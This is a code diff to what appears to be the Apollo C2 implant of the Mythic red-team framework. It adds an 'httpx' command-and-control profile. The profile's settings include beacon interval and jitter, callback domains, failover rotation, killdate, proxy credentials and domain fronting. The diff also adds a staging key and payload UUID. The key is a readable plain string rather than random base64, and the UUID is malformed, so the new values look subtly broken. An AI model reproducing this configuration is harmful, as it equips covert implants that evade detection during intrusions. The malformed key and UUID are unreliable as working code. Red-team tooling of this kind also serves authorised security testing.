@@ -7,10 +7,14 @@
 //#define WEBSOCKET
 //#define TCP
 //#define SMB
+//#define HTTPX
 #endif
 
 #if HTTP
 using HttpTransport;
+#endif
+#if HTTPX
+using HttpxTransport;
 #endif
 using System;
 using System.Collections.Generic;
@@ -145,7 +149,44 @@ namespace Apollo
 #endif
                     }
                 }
-            }
+            },
+#endif
+#if HTTPX
+            { "httpx", new C2ProfileData()
+                {
+                    TC2Profile = typeof(HttpxProfile),
+                    TCryptography = typeof(PSKCryptographyProvider),
+                    TSerializer = typeof(EncryptedJsonSerializer),
+                    Parameters = new Dictionary<string, string>()
+                    {
+#if LOCAL_BUILD
+                        { "callback_interval", "10" },
+                        { "callback_jitter", "23" },
+                        { "callback_domains", "https://example.com:443" },
+                        { "domain_rotation", "fail-over" },
+                        { "failover_threshold", "5" },
+                        { "encrypted_exchange_check", "true" },
+                        { "killdate", "-1" },
+                        { "raw_c2_config", "" },
+#else
+                        { "callback_interval", "httpx_callback_interval_here" },
+                        { "callback_jitter", "httpx_callback_jitter_here" },
+                        { "callback_domains", "httpx_callback_domains_here" },
+                        { "domain_rotation", "httpx_domain_rotation_here" },
+                        { "failover_threshold", "httpx_failover_threshold_here" },
+                        { "encrypted_exchange_check", "httpx_encrypted_exchange_check_here" },
+                        { "killdate", "httpx_killdate_here" },
+                        { "raw_c2_config", "httpx_raw_c2_config_here" },
+                        { "proxy_host", "httpx_proxy_host_here" },
+                        { "proxy_port", "httpx_proxy_port_here" },
+                        { "proxy_user", "httpx_proxy_user_here" },
+                        { "proxy_pass", "httpx_proxy_pass_here" },
+                        { "domain_front", "httpx_domain_front_here" },
+                        { "timeout", "httpx_timeout_here" },
+#endif
+                    }
+                }
+            },
 #endif
         };
 
@@ -160,6 +201,8 @@ namespace Apollo
         public static string StagingRSAPrivateKey = "NNLlAegRMB8DIX7EZ1Yb6UlKQ4la90QsisIThCyhfCc=";
 #elif TCP
         public static string StagingRSAPrivateKey = "Zq24zZvWPRGdWwEQ79JXcHunzvcOJaKLH7WtR+gLiGg=";
+#elif HTTPX
+        public static string StagingRSAPrivateKey = "HttpxApolloKey2024SecureRandomString123456789";
 #endif
 #if HTTP
         public static string PayloadUUID = "b40195db-22e5-4f9f-afc5-2f170c3cc204";
@@ -169,6 +212,8 @@ namespace Apollo
         public static string PayloadUUID = "aff94490-1e23-4373-978b-263d9c0a47b3";
 #elif TCP
         public static string PayloadUUID = "bfc167ea-9142-4da3-b807-c57ae054c544";
+#elif HTTPX
+        public static string PayloadUUID = "httpx-apollo-uuid-2024-12345678-90ab-cdef-1234-567890abcdef";
 #endif
 #else
         // TODO: Make the AES key a config option specific to each profile
